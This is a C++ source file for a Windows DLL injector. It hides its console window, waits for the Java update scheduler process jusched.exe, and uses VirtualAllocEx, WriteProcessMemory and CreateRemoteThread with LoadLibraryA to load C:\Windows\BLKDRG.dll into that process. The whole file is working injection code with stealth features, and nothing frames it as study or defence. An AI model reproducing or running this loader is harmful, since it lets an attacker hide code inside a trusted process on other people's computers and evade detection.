// Dll I Try.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
//#include <string.h>
#include <string>
#include <fstream>
using namespace std;


DWORD FindProcessId(const std::wstring& processName);


int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	//Sleep(5000);
	

	DWORD id = FindProcessId(L"jusched.exe");
	
	int a = 1;

	while (id == NULL) {
		Sleep(100);
		id = FindProcessId(L"jusched.exe");
		//cout << a++ << " - TRY : " << id << endl;
	}


	// path to our dll
	LPCSTR DllPath = "C:\\Windows\\BLKDRG.dll";


	ifstream f("C:\\Windows\\BLKDRG.dll");

	cout << f.good()<<endl;

	// Open a handle to target process
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

	

	

	
	// Allocate memory for the dllpath in the target process
	// length of the path string + null terminator
	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath) + 1,
		MEM_COMMIT, PAGE_READWRITE);

	// Write the path to the address of the memory we just allocated
	// in the target process
	WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath,
		strlen(DllPath) + 1, 0);

	// Create a Remote Thread in the target process which
	// calls LoadLibraryA as our dllpath as an argument -> program loads our dll
	HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"),
			"LoadLibraryA"), pDllPath, 0, 0);

	// Wait for the execution of our loader thread to finish
	WaitForSingleObject(hLoadThread, 0);

	std::cout << "Dll path allocated at: " << std::hex << pDllPath << std::endl;
	
	// Free the memory allocated for our dll path
	//VirtualFreeEx(hProcess, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);
	
	return 0;
}

















DWORD FindProcessId(const std::wstring& processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}


	return 0;
}